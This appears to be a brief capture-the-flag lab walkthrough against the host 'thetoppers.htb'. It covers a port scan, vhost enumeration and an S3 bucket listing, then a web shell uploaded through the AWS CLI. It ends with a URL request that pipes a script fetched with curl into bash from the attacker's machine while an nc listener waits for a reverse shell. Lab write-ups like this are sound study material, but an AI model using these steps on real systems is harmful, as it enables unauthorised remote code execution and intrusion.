# 1.Port Scan
ip=10.129.227.248
`nmap -sC -sV -p- $ip`

![d2fdcc6d25130d8c240c32c34cc88182.png](../_resources/d2fdcc6d25130d8c240c32c34cc88182.png)




# 2.Thetoppers.htb connect

**http://$ip/#contact**

![a06297cc4c378bf0bdc1d3086dfef1ee.png](../_resources/a06297cc4c378bf0bdc1d3086dfef1ee.png)


`sudo vim /etc/hosts`

![d147ea4f9870238913393c1061383b89.png](../_resources/d147ea4f9870238913393c1061383b89.png)

# 3 Directory Enumeration
`gobuster vhost -w /home/kali/Three/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb` 

# 4 AWS Service
![1aea30a5c2183c350c7b3b33993409bf.png](../_resources/1aea30a5c2183c350c7b3b33993409bf.png)
 
 ##  Shellscript Upload


**http://thetoppers.htb/shell.php?cmd=id**

![4c7551d9f3c27222ada7ea4551fc8e3a.png](../_resources/4c7551d9f3c27222ada7ea4551fc8e3a.png)

## aws ls
`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

![812a2beaf4ad8796f788ace6a3235e6c.png](../_resources/812a2beaf4ad8796f788ace6a3235e6c.png)

## use test.sh
`aws --endpoint=http://s3.thetoppers.htb s3 cp test.sh s3://thetoppers.htb`

## use shell.php
`aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb` 

![f18a34dc541f070b1b36276997d79d88.png](../_resources/f18a34dc541f070b1b36276997d79d88.png)

## AWS Connect
`python3 -m http.server 8080`

![e6f9b8a8d7fa3b12441ddf80f3e9efcc.png](../_resources/e6f9b8a8d7fa3b12441ddf80f3e9efcc.png)

`sudo nc -lvnp 443`

![1c61e34330c70c7a1b6aacafb604d235.png](../_resources/1c61e34330c70c7a1b6aacafb604d235.png)

## URL Request
**http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.8:8080/test.sh|bash**

## 5 AWS Connect&Flag get
![f3a8e39bfdd603bc65f601aacf16e792.png](../_resources/f3a8e39bfdd603bc65f601aacf16e792.png)

![d370a2101c42645345a50ede6eaaa65c.png](../_resources/d370a2101c42645345a50ede6eaaa65c.png)
